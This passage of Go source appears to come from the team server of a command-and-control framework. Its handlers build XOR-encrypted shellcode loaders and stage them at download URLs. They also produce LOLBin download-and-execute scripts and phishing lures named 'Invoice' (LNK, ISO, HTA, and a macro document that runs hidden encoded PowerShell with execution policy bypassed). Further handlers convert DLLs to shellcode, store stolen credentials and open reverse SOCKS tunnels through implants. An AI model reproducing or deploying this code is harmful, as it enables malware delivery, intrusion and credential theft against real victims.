		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
		op := operatorFromCert(r)
		s.printf("[%s] loader shellcode: raw=%dKB → compressed=%dKB (%.0f%%)\n",
			op, len(rawBin)/1024, len(compressed)/1024,
			float64(len(compressed))*100/float64(len(rawBin)))
		loaderPath, err := BuildLoader(cfg, binURL, keyHex, deliveryDir)
		if err != nil {
			jsonErr(w, "build loader: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["loader"] = loaderPath
		result["bin_stage"] = binURL
		result["compressed_kb"] = fmt.Sprintf("%d", len(compressed)/1024)
		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
		s.printf("[%s] build loader: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
		jsonOK(w, result)
		return

	case cfg.Format == "lolbin":
		if cfg.StageURL == "" {
			jsonErr(w, "stage-url required for format=lolbin", http.StatusBadRequest)
			return
		}
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		// Stage the raw EXE (LOLBins download and execute it directly)
		exeToken, err := RegisterStage(exePath, "application/octet-stream", cfg.StageMaxDL)
		if err != nil {
			jsonErr(w, "stage exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		exeURL := cfg.StageURL + "/stage/" + exeToken
		SetStageURL(exeToken, exeURL)
		result["exe_stage"] = exeURL

		op := operatorFromCert(r)
		techniques := []string{"certutil", "bitsadmin", "msiexec", "regsvr32", "mshta", "wmic"}
		for _, tech := range techniques {
			batPath, err := BuildLOLBinLoader(tech, exeURL, deliveryDir, "payload")
			if err != nil {
				jsonErr(w, "build lolbin "+tech+": "+err.Error(), http.StatusInternalServerError)
				return
			}
			result[tech] = batPath
		}
		s.printf("[%s] build lolbin: stage=%s…\n", op, exeURL[:min(len(exeURL), 60)])
		jsonOK(w, result)
		return

	case cfg.Format == "loader-c":
		if cfg.StageURL == "" {
			jsonErr(w, "stage-url required for format=loader-c", http.StatusBadRequest)
			return
		}
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binPath, err := BuildRAW(exePath, payloadsDir)
		if err != nil {
			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
			return
		}
		rawBin, err := os.ReadFile(binPath)
		if err != nil {
			jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		// No compression — C loader does XOR-only; executing compressed bytes as
		// shellcode would fault. Encrypt raw shellcode directly.
		key, _ := xorKey()
		encBin := xorBytes(rawBin, key)
		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
		if encErr != nil {
			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		if _, encErr = encFile.Write(encBin); encErr != nil {
			encFile.Close()
			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		encFile.Close()
		encBinPath := encFile.Name()
		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
		if err != nil {
			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binURL := cfg.StageURL + "/stage/" + binToken
		SetStageURL(binToken, binURL)
		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
		op := operatorFromCert(r)
		s.printf("[%s] loader-c shellcode: raw=%dKB (no compression)\n",
			op, len(rawBin)/1024)
		loaderPath, err := BuildCLoader(cfg, binURL, keyHex, deliveryDir)
		if err != nil {
			jsonErr(w, "build loader-c: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["loader"] = loaderPath
		result["bin_stage"] = binURL
		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
		result["key_hex"] = keyHex
		s.printf("[%s] build loader-c: stage=%s key=%s\n", op, binURL[:min(len(binURL), 60)], keyHex)
		jsonOK(w, result)
		return

	case cfg.Format == "loader-nim":
		if cfg.StageURL == "" {
			jsonErr(w, "stage-url required for format=loader-nim", http.StatusBadRequest)
			return
		}
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binPath, err := BuildRAW(exePath, payloadsDir)
		if err != nil {
			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
			return
		}
		rawBin, err := os.ReadFile(binPath)
		if err != nil {
			jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		// No compression — Nim loader does XOR-only; executing compressed bytes as
		// shellcode would fault. Encrypt raw shellcode directly.
		key, _ := xorKey()
		encBin := xorBytes(rawBin, key)
		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
		if encErr != nil {
			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		if _, encErr = encFile.Write(encBin); encErr != nil {
			encFile.Close()
			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		encFile.Close()
		encBinPath := encFile.Name()
		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
		if err != nil {
			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binURL := cfg.StageURL + "/stage/" + binToken
		SetStageURL(binToken, binURL)
		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
		op := operatorFromCert(r)
		s.printf("[%s] loader-nim shellcode: raw=%dKB (no compression)\n",
			op, len(rawBin)/1024)
		loaderPath, err := BuildNimLoader(cfg, binURL, keyHex, deliveryDir)
		if err != nil {
			jsonErr(w, "build loader-nim: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["loader"] = loaderPath
		result["bin_stage"] = binURL
		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
		s.printf("[%s] build loader-nim: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
		jsonOK(w, result)
		return

	case cfg.Format == "lnk" || cfg.Format == "iso" || cfg.Format == "hta" ||
		cfg.Format == "docm" ||
		cfg.Format == "ps1" || cfg.Format == "bat" || cfg.Format == "jscript" ||
		cfg.Format == "vbscript" || cfg.Format == "sct" || cfg.Format == "wsf" || cfg.Format == "zip":
		if cfg.StageURL == "" {
			jsonErr(w, "stage-url required for format="+cfg.Format, http.StatusBadRequest)
			return
		}
		// Derive lure filename stem: LureName → OutputName stem → fallback
		lnkLure := cfg.LureName
		if lnkLure == "" && cfg.OutputName != "" {
			lnkLure = strings.TrimSuffix(cfg.OutputName, filepath.Ext(cfg.OutputName))
		}
		if lnkLure == "" {
			lnkLure = "Invoice"
		}
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binPath, err := BuildRAW(exePath, payloadsDir)
		if err != nil {
			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
			return
		}
		// XOR-encrypt the shellcode before staging so an intercepted download
		// reveals ciphertext only. The key is embedded in the PS loader.
		key, keyErr := xorKey()
		if keyErr != nil {
			// zero key = no encryption (fallback; never expected in practice)
			key = [4]byte{}
		}
		rawBin, err := os.ReadFile(binPath)
		if err != nil {
			jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		encBin := xorBytes(rawBin, key)
		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
		if encErr != nil {
			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		if _, encErr = encFile.Write(encBin); encErr != nil {
			encFile.Close()
			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		encFile.Close()
		encBinPath := encFile.Name()

		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
		if err != nil {
			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binURL := cfg.StageURL + "/stage/" + binToken
		SetStageURL(binToken, binURL)

		// Prefer pre-compiled runner DLL (no Add-Type temp file on victim).
		// Falls back to Add-Type PS loader when no C# compiler is available.
		var ps string
		if runnerDLL, err := buildRunnerDLL(payloadsDir); err == nil && runnerDLL != "" {
			runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
			if err != nil {
				jsonErr(w, "stage runner.dll: "+err.Error(), http.StatusInternalServerError)
				return
			}
			runnerURL := cfg.StageURL + "/stage/" + runnerToken
			SetStageURL(runnerToken, runnerURL)
			ps = psReflectiveLoader(runnerURL, binURL, key)
			result["runner_stage"] = runnerURL
		} else {
			ps = psShellcodeLoader(binURL, key)
		}
		// Stage the full PS1 and use a short LNK stub (~260 chars).
		// Windows truncates LNK Arguments at ~4096 chars; the encoded PS loader
		// is 6000+ chars and would be silently cut, leaving PowerShell with nothing.
		psArgs, ps1URL, err := StageLNKLoader(ps, cfg.StageURL, deliveryDir)
		if err != nil {
			jsonErr(w, "stage ps1: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["ps1_stage"] = ps1URL
		op := operatorFromCert(r)

		switch cfg.Format {
		case "lnk":
			lnkPath, err := BuildLNK(psArgs, deliveryDir, lnkLure)
			if err != nil {
				jsonErr(w, "build lnk: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["lnk"] = lnkPath
			result["bin_stage"] = binURL
			s.printf("[%s] build lnk: stage=%s…\n", op, binURL[:min(len(binURL), 60)])

		case "iso":
			lnkPath, err := BuildLNK(psArgs, deliveryDir, lnkLure)
			if err != nil {
				jsonErr(w, "build lnk: "+err.Error(), http.StatusInternalServerError)
				return
			}
			isoPath, err := BuildISO(map[string]string{lnkLure + ".lnk": lnkPath}, "Documents", deliveryDir)
			if err != nil {
				jsonErr(w, "build iso: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["iso"] = isoPath
			result["bin_stage"] = binURL
			s.printf("[%s] build iso: stage=%s…\n", op, binURL[:min(len(binURL), 60)])

		case "hta":
			htaPath, err := BuildHTA(ps, deliveryDir, lnkLure)
			if err != nil {
				jsonErr(w, "build hta: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["hta"] = htaPath
			result["bin_stage"] = binURL
			s.printf("[%s] build hta: stage=%s…\n", op, binURL[:min(len(binURL), 60)])

		case "docm":
			// Word macro document — AutoOpen runs the PS loader via WScript.Shell
			psCmd := fmt.Sprintf("powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s",
				utf16LEBase64(ps))
			docmPath, err := BuildWordMacro(psCmd, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build docm: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["docm"] = docmPath
			result["bin_stage"] = binURL
			s.printf("[%s] build docm: stage=%s…\n", op, binURL[:min(len(binURL), 60)])

		case "ps1":
			path, err := BuildPS1(ps, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build ps1: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["ps1"] = path
			result["bin_stage"] = binURL
			s.printf("[%s] build ps1: stage=%s…\n", op, binURL[:min(len(binURL), 60)])

		case "bat":
			path, err := BuildBAT(ps, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build bat: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["bat"] = path
			result["bin_stage"] = binURL

		case "jscript":
			path, err := BuildJScript(ps, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build jscript: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["js"] = path
			result["bin_stage"] = binURL

		case "vbscript":
			path, err := BuildVBScript(ps, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build vbscript: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["vbs"] = path
			result["bin_stage"] = binURL

		case "sct":
			path, err := BuildSCT(ps, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build sct: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["sct"] = path
			result["bin_stage"] = binURL
			s.printf("[%s] build sct: stage=%s…\n", op, binURL[:min(len(binURL), 60)])

		case "wsf":
			path, err := BuildWSF(ps, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build wsf: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["wsf"] = path
			result["bin_stage"] = binURL

		case "zip":
			lnkPath, err := BuildLNK(psArgs, deliveryDir, lnkLure)
			if err != nil {
				jsonErr(w, "build lnk: "+err.Error(), http.StatusInternalServerError)
				return
			}
			zipPath, err := BuildZIPLNK(lnkPath, lnkLure, deliveryDir)
			if err != nil {
				jsonErr(w, "build zip: "+err.Error(), http.StatusInternalServerError)
				return
			}
			result["zip"] = zipPath
			result["bin_stage"] = binURL
		}

	case cfg.Format == "srdi":
		// Build DLL → convert to PIC shellcode via sRDI → XOR-encrypt → stage → C loader
		dllPath, err := BuildDLL(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build dll: "+err.Error(), http.StatusInternalServerError)
			return
		}
		srdiFlags := 0x1 // clear PE header on load
		binPath, err := BuildSRDI(dllPath, "StartAgent", nil, srdiFlags, payloadsDir)
		if err != nil {
			jsonErr(w, "sRDI convert: "+err.Error(), http.StatusInternalServerError)
			return
		}
		rawBin, err := os.ReadFile(binPath)
		if err != nil {
			jsonErr(w, "read srdi bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		key, _ := xorKey()
		encBin := xorBytes(rawBin, key)
		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
		if encErr != nil {
			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		if _, encErr = encFile.Write(encBin); encErr != nil {
			encFile.Close()
			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		encFile.Close()
		encBinPath := encFile.Name()
		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
		if err != nil {
			jsonErr(w, "stage srdi bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		stageBase := cfg.StageURL
		if stageBase == "" {
			stageBase = cfg.ServerURL
		}
		binURL := stageBase + "/stage/" + binToken
		SetStageURL(binToken, binURL)
		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
		op := operatorFromCert(r)
		s.printf("[%s] sRDI shellcode: %dKB → staged %s\n", op, len(rawBin)/1024, binURL)
		loaderPath, err := BuildCLoader(cfg, binURL, keyHex, deliveryDir)
		if err != nil {
			jsonErr(w, "build loader-c: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["loader"] = loaderPath
		result["bin_stage"] = binURL
		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
		result["key_hex"] = keyHex
		s.printf("[%s] build srdi: stage=%s key=%s\n", op, binURL[:min(len(binURL), 60)], keyHex)
		jsonOK(w, result)
		return

	case cfg.Format == "bin":
		// Raw shellcode only — build EXE then convert to .bin via donut
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binPath, err := BuildRAW(exePath, payloadsDir)
		if err != nil {
			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["bin"] = binPath
		if cfg.Encrypt != "" {
			if encPath, stubPath, err := EncryptPayload(binPath, cfg.Encrypt, payloadsDir); err == nil {
				result["enc"] = encPath
				result["stub"] = stubPath
			}
		}

	default: // "exe"
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["exe"] = exePath
	}

	jsonOK(w, result)
}

func (s *Server) apiGenCert(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Label string `json:"label"`
	}
	if err := jsonBody(r, &req); err != nil || req.Label == "" {
		jsonErr(w, "missing label", http.StatusBadRequest)
		return
	}
	certPEM, keyPEM, err := s.ca.SignAgentCert(req.Label)
	if err != nil {
		jsonErr(w, err.Error(), http.StatusInternalServerError)
		return
	}
	jsonOK(w, map[string]string{
		"cert_pem": string(certPEM),
		"key_pem":  string(keyPEM),
		"ca_pem":   string(s.ca.CACertPEM),
	})
}

// apiBuildStream runs BuildEXEStream and sends SSE events: progress lines then a JSON result event.
func (s *Server) apiBuildStream(w http.ResponseWriter, r *http.Request, cfg BuildConfig) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		jsonErr(w, "streaming not supported", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("X-Accel-Buffering", "no")

	sseJSON := func(v any) {
		b, _ := json.Marshal(v)
		fmt.Fprintf(w, "data: %s\n\n", b)
		flusher.Flush()
	}

	// sseLineWriter wraps w so each written line becomes an SSE progress event.
	pw := &sseLineWriter{w: w, flusher: flusher}

	payloadsDir := filepath.Join(projectRoot(), "bin", "payloads")
	os.MkdirAll(payloadsDir, 0755)

	// Only EXE streaming is supported (garble is Windows-EXE only)
	exePath, err := BuildEXEStream(cfg, payloadsDir, pw)
	if err != nil {
		sseJSON(map[string]any{"type": "error", "message": err.Error()})
		return
	}
	result := map[string]string{"exe": exePath}
	if rawPath, err := BuildRAW(exePath, payloadsDir); err == nil {
		result["bin"] = rawPath
		if cfg.Encrypt != "" {
			if encPath, stubPath, err2 := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err2 == nil {
				result["enc"] = encPath
				result["stub"] = stubPath
			}
		}
	}
	sseJSON(map[string]any{"type": "done", "result": result})
}

// sseLineWriter writes each newline-terminated chunk as an SSE progress event.
type sseLineWriter struct {
	w       io.Writer
	flusher http.Flusher
	buf     string
}

func (s *sseLineWriter) Write(p []byte) (int, error) {
	s.buf += string(p)
	for {
		idx := strings.IndexByte(s.buf, '\n')
		if idx < 0 {
			break
		}
		line := s.buf[:idx]
		s.buf = s.buf[idx+1:]
		if line != "" {
			fmt.Fprintf(s.w, "data: %s\n\n", line)
			s.flusher.Flush()
		}
	}
	return len(p), nil
}

// ── helpers ───────────────────────────────────────────────────────────────

func jsonOK(w http.ResponseWriter, v any) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"ok": true, "data": v})
}

func jsonErr(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": msg})
}

func jsonBody(r *http.Request, v any) error {
	body, err := io.ReadAll(io.LimitReader(r.Body, 64*1024*1024))
	if err != nil {
		return err
	}
	return json.Unmarshal(body, v)
}

func operatorFromCert(r *http.Request) string {
	if r.TLS != nil && len(r.TLS.PeerCertificates) > 0 {
		return r.TLS.PeerCertificates[0].Subject.CommonName
	}
	return "unknown"
}

func (s *Server) apiReport(w http.ResponseWriter, r *http.Request) {
	data, err := s.db.GetReportData()
	if err != nil {
		jsonErr(w, err.Error(), http.StatusInternalServerError)
		return
	}
	jsonOK(w, data)
}

// ── credential vault ──────────────────────────────────────────────────────

func (s *Server) apiCreds(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		filter := r.URL.Query().Get("q")
		creds, err := s.db.ListCreds(filter)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, creds)

	case http.MethodPost:
		var req struct {
			Type     string `json:"type"`
			Domain   string `json:"domain"`
			Username string `json:"username"`
			Secret   string `json:"secret"`
			Host     string `json:"host"`
			Source   string `json:"source"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if req.Username == "" || req.Secret == "" {
			jsonErr(w, "username and secret required", http.StatusBadRequest)
			return
		}
		if req.Type == "" {
			req.Type = "plaintext"
		}
		op := operatorFromCert(r)
		id, err := s.db.AddCred(req.Type, req.Domain, req.Username, req.Secret, req.Host, req.Source, op)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		s.printf("[%s] cred added: %s\\%s (%s)\n", op, req.Domain, req.Username, req.Type)
		jsonOK(w, map[string]int64{"id": id})

	default:
		jsonErr(w, "GET or POST required", http.StatusMethodNotAllowed)
	}
}

func (s *Server) apiCredAction(w http.ResponseWriter, r *http.Request) {
	idStr := strings.TrimPrefix(r.URL.Path, "/api/creds/")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		jsonErr(w, "invalid id", http.StatusBadRequest)
		return
	}
	switch r.Method {
	case http.MethodDelete:
		if err := s.db.DeleteCred(id); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]string{"status": "deleted"})
	case http.MethodPut:
		var req struct {
			Type     string `json:"type"`
			Domain   string `json:"domain"`
			Username string `json:"username"`
			Secret   string `json:"secret"`
			Host     string `json:"host"`
			Source   string `json:"source"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if err := s.db.UpdateCred(id, req.Type, req.Domain, req.Username, req.Secret, req.Host, req.Source); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]string{"status": "updated"})
	default:
		jsonErr(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ── operator roles ────────────────────────────────────────────────────────

func (s *Server) apiRoles(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		roles, err := s.db.ListRoles()
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, roles)

	case http.MethodPost:
		var req struct {
			Operator string `json:"operator"`
			Role     string `json:"role"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if req.Operator == "" || req.Role == "" {
			jsonErr(w, "operator and role required", http.StatusBadRequest)
			return
		}
		if req.Role != RoleAdmin && req.Role != RoleOperator && req.Role != RoleViewer {
			jsonErr(w, "role must be admin|operator|viewer", http.StatusBadRequest)
			return
		}
		if err := s.db.SetOperatorRole(req.Operator, req.Role); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		op := operatorFromCert(r)
		s.printf("[%s] role set: %s → %s\n", op, req.Operator, req.Role)
		jsonOK(w, map[string]string{"status": "ok"})

	default:
		jsonErr(w, "GET or POST required", http.StatusMethodNotAllowed)
	}
}

// ── reverse SOCKS5 ────────────────────────────────────────────────────────

// apiRSocks manages reverse SOCKS5 tunnels through agents.
//
//   POST   /api/rsocks  {"agent_id":"...", "socks_port":1080, "user":"u", "pass":"p"}
//     → starts rsocks, queues RSOCKS_START on agent
//     → returns {"socks_port":1080, "callback_port":N, "status":"started"}
//   DELETE /api/rsocks  {"agent_id":"..."}
//     → stops rsocks, queues RSOCKS_STOP on agent
func (s *Server) apiRSocks(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodPost:
		var req struct {
			AgentID   string `json:"agent_id"`
			SocksPort int    `json:"socks_port"`
			User      string `json:"user"`
			Pass      string `json:"pass"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if req.AgentID == "" {
			jsonErr(w, "agent_id required", http.StatusBadRequest)
			return
		}
		if req.SocksPort == 0 {
			req.SocksPort = 1080
		}
		agents, _ := s.db.ListAgents()
		for _, a := range agents {
			if strings.HasPrefix(a.ID, req.AgentID) {
				req.AgentID = a.ID
				break
			}
		}
		callbackPort, err := s.StartRSocks(req.AgentID, req.SocksPort, req.User, req.Pass)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		op := operatorFromCert(r)
		s.db.QueueTask(req.AgentID, "RSOCKS_START", strconv.Itoa(callbackPort), nil, op)
		s.printf("[%s] rsocks: agent=%s socks=:%d callback=:%d\n",
			op, req.AgentID[:8], req.SocksPort, callbackPort)
		resp := map[string]interface{}{
			"socks_port":    req.SocksPort,
			"callback_port": callbackPort,
			"status":        "started",
		}
		if req.User != "" {
			resp["auth"] = req.User
		}
		jsonOK(w, resp)

	case http.MethodDelete:
		var req struct {
			AgentID string `json:"agent_id"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if err := s.StopRSocks(req.AgentID); err != nil {
			jsonErr(w, err.Error(), http.StatusNotFound)
			return
		}
		op := operatorFromCert(r)
		s.db.QueueTask(req.AgentID, "RSOCKS_STOP", "", nil, op)
		jsonOK(w, map[string]string{"status": "stopped"})

	default:
		jsonErr(w, "POST or DELETE required", http.StatusMethodNotAllowed)
	}
}

// apiDonut accepts a raw .NET assembly (POST body) and returns raw shellcode
// by converting it with go-donut server-side. Used by the dotnet-asm CLI command.
func (s *Server) apiDonut(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 64<<20))
	if err != nil || len(body) == 0 {
		jsonErr(w, "empty body", http.StatusBadRequest)
		return
	}

	// Write assembly to a temp file
	tmpDir, err := os.MkdirTemp("", "donut_")
	if err != nil {
		jsonErr(w, "tempdir: "+err.Error(), http.StatusInternalServerError)
		return
	}
	defer os.RemoveAll(tmpDir)
	tmpExe, err := os.CreateTemp(tmpDir, "asm_*.exe")
	if err != nil {
		jsonErr(w, "tempfile: "+err.Error(), http.StatusInternalServerError)
		return
	}
	defer os.Remove(tmpExe.Name())
	if _, err := tmpExe.Write(body); err != nil {
		tmpExe.Close()
		jsonErr(w, "write: "+err.Error(), http.StatusInternalServerError)
		return
	}
	tmpExe.Close()

	binPath, err := BuildRAW(tmpExe.Name(), "bin")
	if err != nil {
		jsonErr(w, "donut: "+err.Error(), http.StatusInternalServerError)
		return
	}
	defer os.Remove(binPath)

	sc, err := os.ReadFile(binPath)
	if err != nil {
		jsonErr(w, "read shellcode: "+err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(sc)
}

// apiSRDI accepts a raw Windows DLL (POST body) and returns raw sRDI shellcode.
// Optional query params: func=<exportName> (default ""), flags=<hex int> (default 0x1=clearHeader).
// Mirrors /api/donut but uses sRDI instead of donut.
func (s *Server) apiSRDI(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 64<<20))
	if err != nil || len(body) == 0 {
		jsonErr(w, "empty body", http.StatusBadRequest)
		return
	}

	funcName := r.URL.Query().Get("func")
	flags := 0x1 // clear PE header by default
	if q := r.URL.Query().Get("flags"); q != "" {
		fmt.Sscanf(q, "0x%x", &flags)
	}
	stage := r.URL.Query().Get("stage") == "1"

	tmpDir, err := os.MkdirTemp("", "srdi_")
	if err != nil {
		jsonErr(w, "tempdir: "+err.Error(), http.StatusInternalServerError)
		return
	}
	defer os.RemoveAll(tmpDir)
	tmpDLL := tmpDir + "/payload.dll"
	if err := os.WriteFile(tmpDLL, body, 0600); err != nil {
		jsonErr(w, "write: "+err.Error(), http.StatusInternalServerError)
		return
	}

	binPath, err := BuildSRDI(tmpDLL, funcName, nil, flags, tmpDir)
	if err != nil {
		jsonErr(w, "sRDI: "+err.Error(), http.StatusInternalServerError)
		return
	}

	sc, err := os.ReadFile(binPath)
	if err != nil {
		jsonErr(w, "read shellcode: "+err.Error(), http.StatusInternalServerError)
		return
	}

	if stage {
		// XOR-encrypt and stage the shellcode; return JSON with URL+key
		payloadsDir := filepath.Join(projectRoot(), "bin", "delivery")
		os.MkdirAll(payloadsDir, 0755)
		encPath := filepath.Join(payloadsDir, "srdi_"+filepath.Base(tmpDLL)+".enc")
		key, _ := xorKey()
		encBin := xorBytes(sc, key)
		if err := os.WriteFile(encPath, encBin, 0600); err != nil {
			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
			return
		}
		token, err := RegisterStage(encPath, "application/octet-stream", 0)
		if err != nil {
			jsonErr(w, "stage: "+err.Error(), http.StatusInternalServerError)
			return
		}
		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
		jsonOK(w, map[string]string{
			"stage_token": token,
			"key_hex":     keyHex,
			"size_kb":     fmt.Sprintf("%d", len(sc)/1024),
		})
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(sc)
}

// apiAttackLayer generates a MITRE ATT&CK Navigator layer JSON from observed task types.
// CORS headers are added so the hosted Navigator can fetch it directly via #layerURL=.
func (s *Server) apiAttackLayer(w http.ResponseWriter, r *http.Request) {
	type technique struct {
		TechniqueID        string `json:"techniqueID"`
		Score              int    `json:"score"`
		Comment            string `json:"comment"`
		Enabled            bool   `json:"enabled"`
		ShowSubtechniques  bool   `json:"showSubtechniques"`
	}
	type gradient struct {
		Colors   []string `json:"colors"`
		MinValue int      `json:"minValue"`
		MaxValue int      `json:"maxValue"`
	}
	type legendItem struct {
		Label string `json:"label"`
		Color string `json:"color"`
	}
	type versions struct {
		Attack    string `json:"attack"`
		Navigator string `json:"navigator"`
		Layer     string `json:"layer"`
	}
	type layer struct {
		Name        string       `json:"name"`
		Versions    versions     `json:"versions"`
		Domain      string       `json:"domain"`
		Description string       `json:"description"`
		Techniques  []technique  `json:"techniques"`
